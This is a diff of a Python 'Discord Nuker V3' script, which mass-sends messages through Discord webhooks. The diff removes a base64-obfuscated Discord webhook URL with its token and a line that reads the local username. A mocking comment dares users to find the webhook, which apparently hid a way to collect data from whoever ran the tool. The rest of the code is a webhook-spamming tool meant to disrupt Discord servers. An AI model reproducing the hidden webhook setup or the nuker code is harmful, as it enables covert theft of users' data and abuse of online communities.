@@ -3,15 +3,10 @@ import requests
 import os
 import time
 import json
-import getpass
 from threading import Thread, Lock, current_thread
 import socket
 import base64
 
-# Try finding this webhook skerm fucking skids
-base64_encoded_webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MDUyODE3ODExMzYwOTczOS9kd1ZQbDladUk0RTFBMy1jZ2VfLVZfdjhwSVNyWldaTDliYWVqaVRDNHpUYXR3NV9paGFMYzBkdDNwR3oyMXRLd2tLVw=='
-decoded_webhook = base64.b64decode(base64_encoded_webhook).decode('utf-8')
-username = getpass.getuser()
 init()
 os.system("title Discord Nuker V3")
 lock = Lock()
@@ -37,9 +32,6 @@ def spam_webhooks(message, webhooks, num_messages):
         send_messages(message, webhooks)
         print(Fore.GREEN + "[NUKE]: Message Successfully Sent Without Any Issues!")
         time.sleep(5)
-
-
-
 
 # Loading Phase
 
